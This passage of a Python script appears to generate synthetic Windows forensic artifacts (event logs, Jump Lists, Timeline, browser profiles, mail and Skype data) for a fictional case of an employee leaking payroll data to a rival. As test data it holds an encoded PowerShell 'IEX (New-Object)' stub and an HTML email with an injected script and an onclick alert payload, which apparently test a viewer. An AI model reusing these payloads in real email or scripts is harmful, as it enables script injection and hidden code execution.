            'BytesPerSector': '512'}
    part = ('Microsoft-Windows-Partition/Diagnostic', 'Microsoft-Windows-Partition', '{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}')
    partition = [ev.Event(*part, 1006, t(14, 12, 44), dict(disk, Capacity='15931539456', PartitionCount='1'), task=1006, keywords=0x0,
                          user_sid='S-1-5-18'),
                 ev.Event(*part, 1006, t(14, 41, 10), dict(disk, Capacity='0', PartitionCount='0'), task=1006, keywords=0x0, user_sid='S-1-5-18')]
    write(f'{LOGS}/Security.evtx', ev.write_evtx(security, first_record_id=1))
    write(f'{LOGS}/System.evtx', ev.write_evtx(system, first_record_id=4512))
    write(f'{LOGS}/Microsoft-Windows-PowerShell%4Operational.evtx', ev.write_evtx(ps_op, first_record_id=812))
    write(f'{LOGS}/Windows PowerShell.evtx', ev.write_evtx(ps_classic, first_record_id=233))
    write(f'{LOGS}/Microsoft-Windows-Partition%4Diagnostic.evtx', ev.write_evtx(partition, first_record_id=57))


PROJECT_NOTES = 'Q3 project notes. Nothing sensitive here.\n' * 40
CLEANUP_PS1 = 'powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\n'
# Jump Lists, the Windows Timeline and the thumbnail cache (Phase 7). The story they add: alice opens the payroll export
# from E: in Notepad at 14:14:06 (her Recent shortcut says the same) after browsing E:\Exports; cleanup.ps1 is pinned in
# Notepad's Jump List; Chrome's Jump List remembers the closed upload page; the Windows Timeline shows Notepad in use for
# 95 seconds, SecureDelete.exe starting at 14:18:31 (as BAM says) and E:\payroll-export.csv copied to the clipboard; she
# deleted the Timeline entry for payroll-screenshot.png, which SecureDelete wiped (it is not on the disk), but its
# thumbnail is still in Explorer's thumbnail cache.
ALICE_HOME = 'Users/alice/AppData'
LAPTOP_MAC = 0x00155D01A2B3
NOTEPAD_APPID, EXPLORER_APPID, CHROME_APPID = '9b9cdc69c1c24e2b', 'f01b4d95cf55d32a', '5d696d521de238c3'
SCREENSHOT_HASH, WHITEBOARD_THUMB_HASH = 0x9F3A6C21E4D07B58, 0x41C7D2E09B6F3A15
CHROME_EXE = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'


def spreadsheet_png(width=256, height=144) -> bytes:
    """A picture of a spreadsheet: a dark header row and grid lines (the wiped payroll screenshot's thumbnail)."""
    rows = b''
    for y in range(height):
        row = b'\0'
        for x in range(width):
            if y < 18:
                px = (31, 78, 121)
            elif y % 14 == 4 or x % 64 == 0:
                px = (200, 205, 212)
            elif x < 64 and y % 14 < 10:
                px = (90, 96, 104)
            else:
                px = (255, 255, 255)
            row += bytes(px)
        rows += row
    chunk = lambda kind, data: struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data))
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(rows, 9)) + chunk(b'IEND', b''))


def jump_lists():
    removable = dict(drive_type=winfmt.DRIVE_REMOVABLE, drive_serial=0x6A3C91F2, volume_label='CRUZER', machine_id='laptop-07')
    fixed = dict(drive_type=winfmt.DRIVE_FIXED, drive_serial=0x5E1F22C4, machine_id='laptop-07')
    droid = lambda n: dict(droid_volume=winfmt.droid_uuid(100, LAPTOP_MAC), droid_file=winfmt.droid_uuid(n, LAPTOP_MAC), hostname='laptop-07')
    notepad = [
        dict(number=3, path='E:\\payroll-export.csv', last_used=utc(2026, 9, 1, 14, 14, 6), access_count=1, **droid(3),
             lnk=winfmt.shell_link('E:\\payroll-export.csv', size=len(PAYROLL), created=utc(2026, 9, 1, 14, 13, 10),
                                   modified=utc(2026, 9, 1, 9, 41, 2), accessed=utc(2026, 9, 1, 14, 14, 6), working_dir='E:\\', **removable)),
        dict(number=2, path='C:\\Users\\alice\\Downloads\\cleanup.ps1', last_used=utc(2026, 9, 1, 10, 6, 45), access_count=2, pin=0,
             **droid(2), lnk=winfmt.shell_link('C:\\Users\\alice\\Downloads\\cleanup.ps1', size=len(CLEANUP_PS1),
                                                created=utc(2026, 9, 1, 10, 6, 30), modified=utc(2026, 9, 1, 10, 6, 30),
                                                accessed=utc(2026, 9, 1, 10, 6, 45), **fixed)),
        dict(number=1, path='C:\\Users\\alice\\Documents\\project-notes.txt', last_used=utc(2026, 8, 28, 16, 5), access_count=3,
             **droid(1), lnk=winfmt.shell_link('C:\\Users\\alice\\Documents\\project-notes.txt', size=len(PROJECT_NOTES),
                                                created=utc(2026, 8, 28, 16, 4, 10), modified=utc(2026, 8, 28, 16, 4, 10),
                                                accessed=utc(2026, 8, 28, 16, 5), **fixed)),
    ]
    explorer = [
        dict(number=2, path='E:\\Exports', last_used=utc(2026, 9, 1, 14, 13, 2), access_count=1, **droid(5),
             lnk=winfmt.shell_link('E:\\Exports', size=0, created=utc(2026, 9, 1, 9, 41, 2), modified=utc(2026, 9, 1, 9, 41, 2),
                                   accessed=utc(2026, 9, 1, 14, 13, 2), attributes=0x10, **removable)),
        dict(number=1, path='C:\\Users\\alice\\Documents', last_used=utc(2026, 9, 1, 14, 10, 12), access_count=4, **droid(4),
             lnk=winfmt.shell_link('C:\\Users\\alice\\Documents', size=0, created=utc(2026, 3, 2, 10, 0), modified=utc(2026, 9, 1, 13, 5),
                                   accessed=utc(2026, 9, 1, 14, 10, 12), attributes=0x10, **fixed)),
    ]
    auto = f'{ALICE_HOME}/Roaming/Microsoft/Windows/Recent/AutomaticDestinations'
    write(f'{auto}/{NOTEPAD_APPID}.automaticDestinations-ms', winfmt.automatic_destinations(notepad))
    write(f'{auto}/{EXPLORER_APPID}.automaticDestinations-ms', winfmt.automatic_destinations(explorer))
    chrome = lambda args, name: winfmt.shell_link(CHROME_EXE, size=2_845_528, created=utc(2026, 7, 14, 9), modified=utc(2026, 7, 14, 9),
                                                  accessed=utc(2026, 9, 1, 8, 50), arguments=args, description=name,
                                                  working_dir='C:\\Program Files\\Google\\Chrome\\Application', **fixed)
    write(f'{ALICE_HOME}/Roaming/Microsoft/Windows/Recent/CustomDestinations/{CHROME_APPID}.customDestinations-ms', winfmt.custom_destinations([
        ('custom', 'Recently closed', [chrome('--profile-directory=Default https://filetransfer.example.net/upload', 'Anonymous File Upload')]),
        ('tasks', [chrome('--new-window', 'New window'), chrome('--incognito', 'New Incognito window')]),
    ]))


def activities_cache(path):
    """ActivitiesCache.db with the Activity and ActivityOperation tables as Windows 10 creates them."""
    import base64
    import json
    con = sqlite3.connect(path)
    common = ('Id GUID NOT NULL, AppId TEXT NOT NULL, PackageIdHash TEXT, AppActivityId TEXT, ActivityType INT NOT NULL, '
              'ParentActivityId GUID NOT NULL, Tag TEXT, "Group" TEXT, MatchId TEXT, LastModifiedTime DATETIME NOT NULL, '
              'ExpirationTime DATETIME NOT NULL, Payload BLOB, Priority INT, PlatformDeviceId TEXT, CreatedInCloud DATETIME NOT NULL, '
              'StartTime DATETIME, EndTime DATETIME, LastModifiedOnClient DATETIME NOT NULL, GroupAppActivityId TEXT, '
              'ClipboardPayload BLOB, EnterpriseId TEXT, OriginalPayload BLOB, OriginalLastModifiedOnClient DATETIME, ETag INT NOT NULL')
    con.execute(f'CREATE TABLE Activity ({common}, ActivityStatus INT, IsLocalOnly INT, PRIMARY KEY("Id"))')
    con.execute(f'CREATE TABLE ActivityOperation (OperationOrder INTEGER PRIMARY KEY ASC NOT NULL, OperationType INT NOT NULL, '
                f'CreatedTime DATETIME NOT NULL, Attachments TEXT, CorrelationVector TEXT, {common})')
    ts = lambda dt: int(dt.timestamp())
    device = 'nMYRXH62tWDtRB8GdjEJlnrWj+K+rZxEr3OtYKlBBNo='
    notepad = json.dumps([{'application': '{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\notepad.exe', 'platform': 'windows_win32'},
                          {'application': 'C:\\Windows\\System32\\notepad.exe', 'platform': 'x_exe_path'}])
    secure = json.dumps([{'application': 'C:\\Users\\alice\\Downloads\\SecureDelete.exe', 'platform': 'x_exe_path'}])
    explorer = json.dumps([{'application': 'Microsoft.Windows.Explorer', 'platform': 'windows_win32'},
                           {'application': '{F38BF404-1D43-42F2-9305-67DE0B28FC23}\\explorer.exe', 'platform': 'x_exe_path'}])
    photos = json.dumps([{'application': 'Microsoft.Windows.Photos_8wekyb3d8bbwe!App', 'platform': 'windows_universal'},
                         {'application': 'Microsoft.Windows.Photos_8wekyb3d8bbwe!App', 'platform': 'packageId'}])
    engaged = lambda secs: json.dumps({'type': 'UserEngaged', 'reportingApp': 'ShellActivityMonitor', 'activeDurationSeconds': secs,
                                       'shellContentDescription': {'MergedGap': 30}, 'userTimezone': 'America/New_York'}).encode()
    opened = lambda text, desc, app, uri: json.dumps({'displayText': text, 'description': desc, 'appDisplayName': app,
                                                      'activationUri': 'ms-shellactivity:', 'contentUri': uri}).encode()
    clip = json.dumps([{'content': base64.b64encode('E:\\payroll-export.csv'.encode()).decode(), 'formatName': 'Text'}]).encode()
    rows = [  # (id, app, type, start, end, payload, clipboard)
        (1, notepad, 5, utc(2026, 9, 1, 14, 14, 6), None, opened('payroll-export.csv', 'E:\\payroll-export.csv', 'Notepad',
                                                                  'file:///E:/payroll-export.csv'), None),
        (2, notepad, 6, utc(2026, 9, 1, 14, 14, 6), utc(2026, 9, 1, 14, 15, 41), engaged(95), None),
        (3, explorer, 10, utc(2026, 9, 1, 14, 13, 30), None, json.dumps({'displayText': ''}).encode(), clip),
        (4, secure, 5, utc(2026, 9, 1, 14, 18, 31), None, opened('SecureDelete.exe', None, 'SecureDelete', None), None),
        (5, secure, 6, utc(2026, 9, 1, 14, 18, 31), utc(2026, 9, 1, 14, 19, 20), engaged(49), None),
    ]
    for n, app, kind, start, end, payload, clipboard in rows:
        modified = end or start
        con.execute('INSERT INTO Activity (Id, AppId, ActivityType, ActivityStatus, ParentActivityId, LastModifiedTime, ExpirationTime, '
                    'Payload, Priority, IsLocalOnly, PlatformDeviceId, CreatedInCloud, StartTime, EndTime, LastModifiedOnClient, '
                    'ClipboardPayload, ETag) VALUES (?,?,?,1,?,?,?,?,3,0,?,0,?,?,?,?,?)',
                    (bytes([n]) * 16, app, kind, b'\0' * 16, ts(modified), ts(modified) + 30 * 86400, payload, device, ts(start),
                     ts(end) if end else 0, ts(modified), clipboard, n))
    deleted_at = utc(2026, 9, 1, 14, 21, 5)
    con.execute('INSERT INTO ActivityOperation (OperationOrder, OperationType, CreatedTime, Id, AppId, ActivityType, ParentActivityId, '
                'LastModifiedTime, ExpirationTime, Payload, Priority, PlatformDeviceId, CreatedInCloud, StartTime, EndTime, '
                'LastModifiedOnClient, ETag) VALUES (1, 3, ?, ?, ?, 5, ?, ?, ?, ?, 3, ?, 0, ?, 0, ?, 6)',
                (ts(deleted_at), bytes([6]) * 16, photos, b'\0' * 16, ts(deleted_at), ts(deleted_at) + 30 * 86400,
                 opened('payroll-screenshot.png', 'C:\\Users\\alice\\Pictures\\payroll-screenshot.png', 'Photos',
                        'file:///C:/Users/alice/Pictures/payroll-screenshot.png'), device, ts(utc(2026, 9, 1, 13, 59, 40)), ts(deleted_at)))
    con.commit()
    con.close()


def user_activity_files():
    jump_lists()
    path = OUT / f'{ALICE_HOME}/Local/ConnectedDevicesPlatform/L.alice/ActivitiesCache.db'
    path.parent.mkdir(parents=True, exist_ok=True)
    path.unlink(missing_ok=True)
    activities_cache(path)
    write(f'{ALICE_HOME}/Local/Microsoft/Windows/Explorer/thumbcache_256.db', winfmt.thumbcache([
        dict(hash=SCREENSHOT_HASH, width=256, height=144, data=spreadsheet_png()),
        dict(hash=0x0D51E7A2C3B48F60),  # an entry Windows reserved without a picture
        dict(hash=WHITEBOARD_THUMB_HASH, width=48, height=32, data=png(48, 32)),
    ]))


# ---------------------------------------------------------------------------------------------------- Phase 9
CHROME_PROFILE = 'Users/alice/AppData/Local/Google/Chrome/User Data/Default'
FIREFOX_PROFILE = 'Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/k2x8.default-release'
THUNDERBIRD = 'Users/alice/AppData/Roaming/Thunderbird/Profiles/q7w1.default-release/ImapMail/imap.corp.example'
PRIVATE_EMAIL = 'alice.private@mailbox.example'


def unix(dt):
    return int(dt.timestamp())


def chrome_profile_files():
    """Web Data (form history and a saved card), Login Data, Bookmarks and Network/Cookies of alice's Chrome profile."""
    rnd = random.Random(9)
    db = sqlite3.connect(OUT / CHROME_PROFILE / 'Web Data')
    db.executescript("""
        CREATE TABLE autofill (name VARCHAR, value VARCHAR, value_lower VARCHAR, date_created INTEGER DEFAULT 0,
                               date_last_used INTEGER DEFAULT 0, count INTEGER DEFAULT 1, PRIMARY KEY (name, value));
        CREATE TABLE credit_cards (guid VARCHAR PRIMARY KEY, name_on_card VARCHAR, expiration_month INTEGER, expiration_year INTEGER,
                                   card_number_encrypted BLOB, date_modified INTEGER NOT NULL DEFAULT 0, origin VARCHAR DEFAULT '',
                                   use_count INTEGER NOT NULL DEFAULT 0, use_date INTEGER NOT NULL DEFAULT 0, billing_address_id VARCHAR,
                                   nickname VARCHAR);
    """)
    for name, value, first, last, count in [
            ('email', PRIVATE_EMAIL, utc(2026, 8, 20, 18, 2, 11), utc(2026, 9, 1, 14, 19, 4), 4),
            ('username', 'alice_x', utc(2026, 8, 20, 18, 2, 30), utc(2026, 8, 20, 18, 2, 30), 1),
            ('q', 'payroll export', utc(2026, 9, 1, 13, 50, 12), utc(2026, 9, 1, 13, 50, 12), 1)]:
        db.execute('INSERT INTO autofill VALUES (?,?,?,?,?,?)', (name, value, value.lower(), unix(first), unix(last), count))
    db.execute('INSERT INTO credit_cards VALUES (?,?,?,?,?,?,?,?,?,?,?)',
               ('0c1d2e3f-4a5b-4c6d-8e7f-a0b1c2d3e4f5', 'Alice Example', 8, 2029, b'v10' + bytes(rnd.getrandbits(8) for _ in range(44)),
                unix(utc(2026, 2, 14, 19, 0)), '', 3, unix(utc(2026, 8, 20, 18, 3)), None, None))
    db.commit()
    db.close()

    db = sqlite3.connect(OUT / CHROME_PROFILE / 'Login Data')
    db.execute("""CREATE TABLE logins (origin_url VARCHAR NOT NULL, action_url VARCHAR, username_element VARCHAR, username_value VARCHAR,
                  password_element VARCHAR, password_value BLOB, submit_element VARCHAR, signon_realm VARCHAR NOT NULL,
                  date_created INTEGER NOT NULL, blacklisted_by_user INTEGER NOT NULL, scheme INTEGER NOT NULL, password_type INTEGER,
                  times_used INTEGER, form_data BLOB, display_name VARCHAR, icon_url VARCHAR, federation_url VARCHAR,
                  skip_zero_click INTEGER, generation_upload_status INTEGER, possible_username_pairs BLOB,
                  id INTEGER PRIMARY KEY AUTOINCREMENT, date_last_used INTEGER NOT NULL DEFAULT 0, moving_blocked_for BLOB,
                  date_password_modified INTEGER NOT NULL DEFAULT 0)""")
    for origin, action, user, pw, created, last, used, never in [
            ('https://filetransfer.example.net/login', 'https://filetransfer.example.net/session', PRIVATE_EMAIL, True,
             utc(2026, 9, 1, 14, 19, 5), utc(2026, 9, 1, 14, 19, 5), 1, 0),
            ('https://mail.example.com/', 'https://mail.example.com/login', 'alice@corp.example', True,
             utc(2025, 11, 3, 9, 12, 40), utc(2026, 9, 1, 12, 55, 2), 87, 0),
            ('https://intranet.corp.example/', '', '', False, utc(2026, 1, 12, 8, 30), utc(2026, 1, 12, 8, 30), 0, 1)]:
        db.execute('INSERT INTO logins(origin_url, action_url, username_element, username_value, password_element, password_value, '
                   'signon_realm, date_created, blacklisted_by_user, scheme, times_used, date_last_used) VALUES (?,?,?,?,?,?,?,?,?,0,?,?)',
                   (origin, action, 'email', user, 'password', b'v10' + bytes(rnd.getrandbits(8) for _ in range(28)) if pw else b'',
                    origin.split('/login')[0].rstrip('/') + '/', chrome_ts(created), never, used, chrome_ts(last)))
    db.commit()
    db.close()

    def node(id_, name, url, added, **kw):
        return {'date_added': str(chrome_ts(added)), 'guid': f'00000000-0000-4000-8000-{id_:012d}', 'id': str(id_), 'name': name,
                'type': 'url', 'url': url, **kw}
    bookmarks = {'checksum': '0' * 32, 'version': 1, 'roots': {
        'bookmark_bar': {'children': [
            node(5, 'Payroll Portal', 'https://intranet.corp.example/hr/payroll', utc(2025, 11, 4, 9, 0)),
            {'children': [node(7, 'SecureDelete - secure file wiping', 'https://tools.example.org/securedelete', utc(2026, 9, 1, 10, 4, 41)),
                          node(8, 'Anonymous File Upload', 'https://filetransfer.example.net/upload', utc(2026, 8, 31, 21, 15, 3))],
             'date_added': str(chrome_ts(utc(2026, 8, 31, 21, 14, 50))), 'date_modified': '0', 'guid': '00000000-0000-4000-8000-000000000006',
             'id': '6', 'name': 'tools', 'type': 'folder'}],
            'date_added': str(chrome_ts(utc(2025, 11, 3, 8, 0))), 'id': '1', 'name': 'Bookmarks bar', 'type': 'folder'},
        'other': {'children': [], 'date_added': str(chrome_ts(utc(2025, 11, 3, 8, 0))), 'id': '2', 'name': 'Other bookmarks', 'type': 'folder'},
        'synced': {'children': [], 'date_added': str(chrome_ts(utc(2025, 11, 3, 8, 0))), 'id': '3', 'name': 'Mobile bookmarks', 'type': 'folder'}}}
    write(f'{CHROME_PROFILE}/Bookmarks', json.dumps(bookmarks, indent=3))

    path = OUT / CHROME_PROFILE / 'Network' / 'Cookies'
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.execute("""CREATE TABLE cookies(creation_utc INTEGER NOT NULL, host_key TEXT NOT NULL, top_frame_site_key TEXT NOT NULL, name TEXT NOT NULL,
                  value TEXT NOT NULL, encrypted_value BLOB NOT NULL, path TEXT NOT NULL, expires_utc INTEGER NOT NULL, is_secure INTEGER NOT NULL,
                  is_httponly INTEGER NOT NULL, last_access_utc INTEGER NOT NULL, has_expires INTEGER NOT NULL, is_persistent INTEGER NOT NULL,
                  priority INTEGER NOT NULL, samesite INTEGER NOT NULL, source_scheme INTEGER NOT NULL, source_port INTEGER NOT NULL,
                  last_update_utc INTEGER NOT NULL, UNIQUE (host_key, top_frame_site_key, name, path))""")
    for host, name, created, expires, persistent in [
            ('filetransfer.example.net', 'ft_session', utc(2026, 9, 1, 14, 19, 2), utc(2026, 9, 1, 14, 49, 2), 0),
            ('.mail.example.com', 'SID', utc(2026, 8, 3, 7, 58, 31), utc(2027, 8, 3, 7, 58, 31), 1),
            ('.google.com', 'NID', utc(2026, 8, 25, 12, 1, 9), utc(2027, 2, 24, 12, 1, 9), 1)]:
        db.execute('INSERT INTO cookies VALUES (?,?,?,?,?,?,?,?,1,1,?,1,?,1,0,2,443,?)',
                   (chrome_ts(created), host, '', name, '', b'v10' + bytes(rnd.getrandbits(8) for _ in range(40)), '/', chrome_ts(expires),
                    chrome_ts(utc(2026, 9, 1, 14, 40)), persistent, chrome_ts(created)))
    db.commit()
    db.close()


def firefox_profile_files():
    db = sqlite3.connect(OUT / FIREFOX_PROFILE / 'formhistory.sqlite')
    db.execute('CREATE TABLE moz_formhistory (id INTEGER PRIMARY KEY, fieldname TEXT NOT NULL, value TEXT NOT NULL, timesUsed INTEGER, '
               'firstUsed INTEGER, lastUsed INTEGER, guid TEXT)')
    db.execute("INSERT INTO moz_formhistory VALUES (1, 'searchbar-history', 'securedelete wipe free space', 1, ?, ?, 'Fh000000001a')",
               (prtime(utc(2026, 9, 1, 14, 17, 20)), prtime(utc(2026, 9, 1, 14, 17, 20))))
    db.execute("INSERT INTO moz_formhistory VALUES (2, 'email', ?, 2, ?, ?, 'Fh000000002b')",
               (PRIVATE_EMAIL, prtime(utc(2026, 8, 22, 19, 40, 1)), prtime(utc(2026, 9, 1, 14, 30, 58))))
    db.commit()
    db.close()
    ms = lambda dt: int(dt.timestamp() * 1000)
    write(f'{FIREFOX_PROFILE}/logins.json', json.dumps({'nextId': 2, 'logins': [{
        'id': 1, 'hostname': 'https://pastebin.example.com', 'httpRealm': None, 'formSubmitURL': 'https://pastebin.example.com',
        'usernameField': 'user', 'passwordField': 'pass',
        'encryptedUsername': 'MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECJ0bS0Uq3c7GBBA3Yp1bJ4tW2x9K8nR5mQ1v',
        'encryptedPassword': 'MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNk3mH0pQ2wVBBhZq8X1rT4uY6vB9nC3jF7kL0pM2sD5gH8=',
        'guid': '{3f6c1b2a-8d4e-4f5a-9b0c-1d2e3f4a5b6c}', 'encType': 1, 'timeCreated': ms(utc(2026, 9, 1, 14, 31, 30)),
        'timeLastUsed': ms(utc(2026, 9, 1, 14, 31, 30)), 'timePasswordChanged': ms(utc(2026, 9, 1, 14, 31, 30)), 'timesUsed': 1}],
        'potentiallyVulnerablePasswords': [], 'dismissedBreachAlertsByLoginGUID': {}, 'version': 3}))


# Email in alice's Thunderbird profile (corporate IMAP account): HR's notice (HTML with an inline logo, a tracking pixel and a
# script that must never run), a contact asking for the list, the payroll export sent to her private address at 14:20:31 UTC,
# and a reply she deleted (still in the Sent folder file until Thunderbird compacts it).
EMAIL_SENT_PAYROLL = {'message_id': '<7f3c2a10-5b1e-4c55-9d1a-2f0d5e6a7b81@corp.example>', 'subject': 'backup',
                      'sent': utc(2026, 9, 1, 14, 20, 31), 'to': PRIVATE_EMAIL}
EMAIL_DELETED_REPLY = {'message_id': '<c19e0b7d-2a44-4e0f-bb61-0f6d2e9a1c33@corp.example>', 'subject': 'Re: the list',
                       'sent': utc(2026, 9, 1, 14, 41, 7), 'to': 'dmitri.k@rivalcorp.example'}
HR_HTML = ('<html><head><style>p{font-family:Arial,sans-serif}</style><script>document.title="pwned";parent.postMessage("pwned","*")</script>'
           '</head><body><p><img src="cid:logo@corp.example" alt="Corp logo" width="48" height="32"></p><p>Hi Alice,</p>'
           '<p>The September payroll export is ready on the portal. Please review it before Friday.</p>'
           '<p><a href="https://intranet.corp.example/hr/payroll">Open the payroll portal</a></p>'
           '<img src="https://tracker.example.com/open.gif?u=alice" width="1" height="1" alt="">'
           '<p onclick="alert(1)">HR Payroll</p></body></html>')


def b64lines(data: bytes) -> str:
    import base64
    s = base64.b64encode(data).decode()
    return '\r\n'.join(s[i:i + 76] for i in range(0, len(s), 76))


def mbox_message(from_line: str, headers: list[tuple[str, str]], body: str) -> str:
    return f'From - {from_line}\r\n' + ''.join(f'{k}: {v}\r\n' for k, v in headers) + '\r\n' + body + '\r\n\r\n'


def thunderbird():
    hr = mbox_message('Tue Sep  1 13:35:14 2026', [
        ('X-Mozilla-Status', '0001'), ('X-Mozilla-Status2', '00000000'),
        ('Received', 'from mx1.corp.example (mx1.corp.example [10.20.0.25]) by imap.corp.example; Tue, 01 Sep 2026 13:35:14 +0000'),
        ('Message-ID', '<a8e2f5c1-77d0-4b8e-9f31-5c2d7e10b4a6@corp.example>'), ('Date', 'Tue, 01 Sep 2026 09:35:12 -0400'),
        ('From', 'HR Payroll <payroll@corp.example>'), ('To', 'Alice Example <alice@corp.example>'),
        ('Subject', 'Payroll export ready for review'), ('MIME-Version', '1.0'),
        ('Content-Type', 'multipart/alternative; boundary="b1-alt"')],
        '--b1-alt\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n'
        'Hi Alice,\r\n\r\nThe September payroll export is ready on the portal. Please review it before Friday.\r\n\r\nHR Payroll\r\n'
        '--b1-alt\r\nContent-Type: multipart/related; boundary="b1-rel"\r\n\r\n'
        '--b1-rel\r\nContent-Type: text/html; charset=utf-8\r\n\r\n' + HR_HTML + '\r\n'
        '--b1-rel\r\nContent-Type: image/png\r\nContent-Transfer-Encoding: base64\r\nContent-ID: <logo@corp.example>\r\n'
        'Content-Disposition: inline; filename="logo.png"\r\n\r\n' + b64lines(png(48, 32)) + '\r\n--b1-rel--\r\n--b1-alt--')
    ask = mbox_message('Mon Aug 31 20:02:46 2026', [
        ('X-Mozilla-Status', '0001'), ('X-Mozilla-Status2', '00000000'),
        ('Received', 'from mx1.corp.example (mx1.corp.example [10.20.0.25]) by imap.corp.example; Mon, 31 Aug 2026 20:02:46 +0000'),
        ('Message-ID', '<5d0b8a3e-1f9c-4a27-8e64-b3f2c9d0e715@rivalcorp.example>'), ('Date', 'Mon, 31 Aug 2026 16:02:44 -0400'),
        ('From', 'Dmitri K <dmitri.k@rivalcorp.example>'), ('To', 'alice@corp.example'), ('Subject', 'the list'),
        ('X-Originating-IP', '[203.0.113.77]'), ('Content-Type', 'text/plain; charset=utf-8')],
        'Can you bring the payroll list before you start? Use the upload site, not work email.\r\n\r\nD.')
    sent = mbox_message('Tue Sep  1 14:20:31 2026', [
        ('X-Mozilla-Status', '0001'), ('X-Mozilla-Status2', '00000000'),
        ('Message-ID', EMAIL_SENT_PAYROLL['message_id']), ('Date', 'Tue, 01 Sep 2026 10:20:31 -0400'),
        ('From', 'Alice Example <alice@corp.example>'), ('To', PRIVATE_EMAIL), ('Subject', 'backup'),
        ('User-Agent', 'Mozilla Thunderbird'), ('MIME-Version', '1.0'), ('Content-Type', 'multipart/mixed; boundary="b2-mix"')],
        '--b2-mix\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nfor home\r\n'
        '--b2-mix\r\nContent-Type: text/csv; name="payroll-export.csv"\r\nContent-Transfer-Encoding: base64\r\n'
        'Content-Disposition: attachment; filename="payroll-export.csv"\r\n\r\n' + b64lines(PAYROLL.encode()) + '\r\n--b2-mix--')
    reply = mbox_message('Tue Sep  1 14:41:07 2026', [
        ('X-Mozilla-Status', '0009'), ('X-Mozilla-Status2', '00000000'),
        ('Message-ID', EMAIL_DELETED_REPLY['message_id']), ('Date', 'Tue, 01 Sep 2026 10:41:07 -0400'),
        ('From', 'Alice Example <alice@corp.example>'), ('To', 'Dmitri K <dmitri.k@rivalcorp.example>'), ('Subject', 'Re: the list'),
        ('In-Reply-To', '<5d0b8a3e-1f9c-4a27-8e64-b3f2c9d0e715@rivalcorp.example>'), ('User-Agent', 'Mozilla Thunderbird'),
        ('Content-Type', 'text/plain; charset=utf-8')],
        'Done. Everything is on the stick and uploaded. Delete this.')
    write(f'{THUNDERBIRD}/INBOX', ask + hr)
    write(f'{THUNDERBIRD}/Sent', sent + reply)
    for folder in ('INBOX', 'Sent'):  # Thunderbird's summary files (only their header here)
        write(f'{THUNDERBIRD}/{folder}.msf', '// <!-- <mdb:mork:z v="1.4"/> -->\r\n< <(a=c)> // (f=iso-8859-1)\r\n')


SKYPE = 'Users/alice/AppData/Roaming/Skype/alice.example/main.db'
SKYPE_MESSAGES = [  # (time, author, display name, type, body)
    (utc(2025, 3, 12, 18, 4, 10), 'dmitri.k.rival', 'Dmitri K', 61, 'Offer letter attached. Start date is flexible.'),
    (utc(2025, 3, 12, 18, 5, 2), 'dmitri.k.rival', 'Dmitri K', 68, '<files alt="offer-letter.pdf"><file size="{size}" index="0">offer-letter.pdf</file></files>'),
    (utc(2025, 3, 12, 18, 7, 45), 'alice.example', 'Alice Example', 61, 'Thanks. I can bring the payroll &amp; client lists when I move.'),
    (utc(2025, 3, 12, 18, 9, 30), 'dmitri.k.rival', 'Dmitri K', 61, 'Good. Don&apos;t use work email for it <ss type="wink">;)</ss>'),
]


def skype_db():
    path = OUT / SKYPE
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.executescript("""
        CREATE TABLE Accounts (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, skypename TEXT, fullname TEXT, emails TEXT,
                               country TEXT, city TEXT, registration_timestamp INTEGER, lastonline_timestamp INTEGER);
        CREATE TABLE Contacts (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, type INTEGER, skypename TEXT, pstnnumber TEXT,
                               fullname TEXT, displayname TEXT, given_displayname TEXT, emails TEXT, country TEXT, city TEXT,
                               phone_mobile TEXT, phone_home TEXT, phone_office TEXT, lastonline_timestamp INTEGER);
        CREATE TABLE Conversations (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, identity TEXT, type INTEGER,
                                    displayname TEXT, given_displayname TEXT, inbox_timestamp INTEGER, last_activity_timestamp INTEGER);
        CREATE TABLE Messages (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, convo_id INTEGER, chatname TEXT, author TEXT,
                               from_dispname TEXT, dialog_partner TEXT, timestamp INTEGER, type INTEGER, body_xml TEXT,
                               edited_timestamp INTEGER, chatmsg_type INTEGER);
        CREATE TABLE Calls (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, begin_timestamp INTEGER, topic TEXT, host_identity TEXT,
                            duration INTEGER, is_incoming INTEGER, is_conference INTEGER, name TEXT);
        CREATE TABLE CallMembers (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, identity TEXT, dispname TEXT, call_duration INTEGER,
                                  call_name TEXT);
        CREATE TABLE Transfers (id INTEGER NOT NULL PRIMARY KEY, is_permanent INTEGER, type INTEGER, partner_handle TEXT, partner_dispname TEXT,
                                status INTEGER, failurereason INTEGER, starttime INTEGER, finishtime INTEGER, filepath TEXT, filename TEXT,
                                filesize TEXT, bytestransferred TEXT, convo_id INTEGER, accepttime INTEGER);
    """)
    db.execute("INSERT INTO Accounts VALUES (1, 1, 'alice.example', 'Alice Example', ?, 'us', 'Boston', ?, ?)",
               (PRIVATE_EMAIL, unix(utc(2019, 6, 2, 17, 0)), unix(utc(2025, 3, 12, 18, 30))))
    db.execute("INSERT INTO Contacts VALUES (1, 1, 1, 'dmitri.k.rival', NULL, 'Dmitri K', 'Dmitri K', NULL, 'dmitri.k@rivalcorp.example', "
               "'us', 'New York', '+1 212 555 0147', NULL, NULL, ?)", (unix(utc(2025, 3, 12, 18, 40)),))
    db.execute("INSERT INTO Conversations VALUES (1, 1, 'dmitri.k.rival', 1, 'Dmitri K', NULL, ?, ?)",
